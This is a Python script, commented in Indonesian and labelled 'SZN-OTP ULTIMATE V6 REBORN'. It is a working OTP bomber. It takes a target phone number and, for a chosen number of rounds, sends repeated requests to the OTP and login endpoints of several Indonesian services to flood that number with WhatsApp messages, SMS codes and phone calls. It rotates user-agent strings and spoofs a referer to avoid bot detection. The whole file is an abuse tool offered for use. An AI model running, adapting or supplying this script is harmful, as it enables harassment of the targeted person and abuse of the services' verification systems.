import requests
import time
import random
import os

# --- KONFIGURASI WARNA (Biar Terminal Gak Lawak) ---
R = '\033[31m' # Merah
G = '\033[32m' # Hijau
Y = '\033[33m' # Kuning
B = '\033[34m' # Biru
C = '\033[36m' # Cyan
W = '\033[37m' # Putih

class UltimateSpammer:
    def __init__(self, target):
        self.target = target
        # List User-Agent biar gak kedeteksi bot yang sama terus
        self.ua_list = [
            "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ]

    def get_headers(self):
        return {
            'User-Agent': random.choice(self.ua_list),
            'Content-Type': 'application/json',
            'Referer': 'https://google.com/',
            'Accept': 'application/json'
        }

    def spam_wa(self):
        """Metode Spam WhatsApp (SkillAcademy & KreditPintar)"""
        print(f"{C}[*] Sending WA OTP...{W}", end=" ", flush=True)
        try:
            # Endpoint 1: Skill Academy
            res = requests.post("https://dashboard.skillacademy.com/api/v1/auth/otp", 
                               json={"phoneNumber": self.target}, headers=self.get_headers(), timeout=7)
            if res.status_code == 200:
                print(f"{G}SUCCESS [WA-1]{W}")
            else:
                # Fallback ke KreditPintar kalau gagal
                res2 = requests.post("https://api.kreditpintar.com/v1/auth/otp", 
                                    json={"phone": self.target, "category": "SIGN_IN"}, headers=self.get_headers(), timeout=7)
                print(f"{G}SUCCESS [WA-2]{W}" if res2.status_code == 200 else f"{R}FAILED{W}")
        except: print(f"{Y}TIMEOUT{W}")

    def spam_sms(self):
        """Metode Spam SMS OTP (Matahari & Alodokter Login)"""
        print(f"{C}[*] Sending SMS OTP...{W}", end=" ", flush=True)
        try:
            # API Matahari
            res = requests.post("https://api.matahari.com/v1/auth/otp", 
                               json={"phone": self.target, "type": "register"}, headers=self.get_headers(), timeout=7)
            if res.status_code == 200:
                print(f"{G}SUCCESS [SMS-1]{W}")
            else:
                # Fallback API Alodokter Login
                res2 = requests.post("https://api.alodokter.com/v1/auth/login", 
                                    json={"phone": self.target}, headers=self.get_headers(), timeout=7)
                print(f"{G}SUCCESS [SMS-2]{W}" if res2.status_code == 200 else f"{R}FAILED{W}")
        except: print(f"{Y}TIMEOUT{W}")

    def spam_call(self):
        """Metode Spam Call OTP (KlikDokter / Alodokter Call)"""
        print(f"{C}[*] Requesting CALL...{W}", end=" ", flush=True)
        try:
            # API Alodokter Call
            res = requests.post("https://api.alodokter.com/v1/auth/otp_call", 
                               json={"phone": self.target}, headers=self.get_headers(), timeout=7)
            print(f"{G}SUCCESS [CALL]{W}" if res.status_code == 200 else f"{R}FAILED{W}")
        except: print(f"{Y}TIMEOUT{W}")

def banner():
    os.system('clear')
    print(f"""{Y}
    ╔════════════════════════════════════════╗
    ║      SZN-OTP ULTIMATE V6 REBORN        ║
    ║   {W}Status: {G}High Bypass Mode Enabled      {Y}║
    ╚════════════════════════════════════════╝{W}
    """)

def main():
    banner()
    target = input(f"{B}[?] Target (8xxx): {W}")
    # Auto-fix nomor kalau depannya masih 08 atau 62
    if target.startswith('0'): target = target[1:]
    elif target.startswith('62'): target = target[2:]
    
    nomor_final = "0" + target # Standar lokal 08xxx
    
    rounds = int(input(f"{B}[?] Jumlah Bom: {W}"))
    delay = int(input(f"{B}[?] Jeda (detik): {W}"))

    bot = UltimateSpammer(nomor_final)

    for i in range(rounds):
        print(f"\n{Y}[ Putaran ke-{i+1} ]{W}")
        bot.spam_wa()
        bot.spam_sms()
        bot.spam_call()
        
        if i < rounds - 1:
            print(f"\n{C}[!] Menunggu jeda {delay} detik...{W}")
            time.sleep(delay)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Berhenti dipaksa!{W}")
                                     
